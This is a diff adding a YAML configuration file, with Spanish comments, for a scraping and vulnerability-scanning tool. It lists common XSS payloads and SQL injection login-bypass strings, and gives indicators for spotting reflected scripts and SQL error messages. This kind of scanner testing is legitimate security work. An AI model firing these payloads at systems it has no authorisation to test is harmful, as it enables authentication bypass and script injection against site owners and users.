@@ -1,0 +1,49 @@
+# Archivo de configuración para la herramienta Scrapper
+
+scraping:
+  user_agent: "ScrapperBot/1.0"     # User-Agent personalizado para solicitudes HTTP
+  timeout: 5                        # Tiempo de espera en segundos para las solicitudes
+
+scanner:
+  xss_payloads:
+    - "<script>alert(1)</script>"
+    - "'><img src=x onerror=alert(1)>"
+    - "<svg/onload=alert(1)>"
+    - "';alert(String.fromCharCode(88,83,83))//"
+    - "\";alert('XSS');//"
+    - "<img src='javascript:alert(1)'>"
+  
+  sql_injection_payloads:
+    - "' OR '1'='1"
+    - "' OR 'a'='a"
+    - "' OR 1=1--"
+    - "\" OR \"\"=\""
+    - "' OR '1'='1' --"
+    - "' OR '1'='1' /*"
+    - "admin' --"
+    - "admin' #"
+    - "admin'/*"
+
+  # Configuración para la detección de respuestas vulnerables
+  # Las siguientes palabras clave se utilizan para identificar posibles vulnerabilidades
+  detection:
+    xss_indicators:
+      - "<script>alert(1)</script>"
+      - "alert(1)"
+      - "<img src=x onerror=alert(1)>"
+      - "XSS"
+    sql_injection_indicators:
+      - "SQL syntax"
+      - "sql error"
+      - "mysql"
+      - "You have an error in your SQL syntax"
+      - "Warning: mysql"
+      - "Unclosed quotation mark after the character string"
+      - "syntax error"
+
+# Parámetros adicionales de escaneo
+scan_parameters:
+  max_links: 50                     # Máximo de enlaces a seguir en el scraping
+  retry_on_failure: true            # Volver a intentar en caso de fallo de conexión
+  max_retries: 3                    # Número máximo de reintentos por solicitud fallida
+  delay_between_requests: 2         # Retraso en segundos entre cada solicitud
